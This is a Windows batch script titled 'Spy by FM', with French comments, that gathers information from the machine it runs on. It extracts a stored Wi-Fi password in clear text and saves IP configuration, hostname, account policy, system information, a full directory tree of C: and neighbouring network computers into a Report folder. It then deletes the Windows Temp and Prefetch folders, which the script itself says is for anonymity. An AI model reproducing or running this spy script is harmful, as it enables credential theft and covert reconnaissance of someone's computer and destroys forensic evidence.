REM  
@echo off
Title 1.1 Spy by FM
REM  ------ couleur du texte vert
color E
chcp 65001

rmdir /s /q Report
md Report
set /p wifipassword="Enter your Wi-fi name : "

REM  ------attente
echo start!
pause >nul

REM  ------ récupération des propriétes de la carte réseau.
ipconfig >Report\ipconfig.txt
echo IP: OK
REM  ------ Plus de details
ipconfig /all >Report\ipconfigall.txt
echo -all ips: OK
REM  ------ Hostname
hostname >Report\hostname.txt
echo -hostname: OK

REM  ------Recuperation du mot de passe
netsh wlan show profile name=%wifipassword% key=clear >Report\wifipassword.txt
echo -wifi password : OK

REM  ------ recuperation des comptes utilisiteur
net accounts >Report\netaccounts.txt

echo -windows accounts: OK

REM  ------ recuperation version windows
ver >Report\versionwindows.txt
echo -version of windows: OK

systeminfo >Report\systeminfo.txt
echo -system information: OK

REM  ------ recuperation de tous les repertoires a partir de c:

tree C: >Report\treeC.txt
echo -organization folders: OK

net view >Report\netview.txt
echo -computers on the network OK

REM  ------ effacer l'ecran
cls
echo effacement des temp pour plus d'anonymat
rmdir /s /q C:\Windows\Temp 
rmdir /s /q C:\Windows\Prefetch
rmdir /s /q C:\OneDriveTemp
cls
echo fait!
REM --- timeout /t 05 /nobreak

exit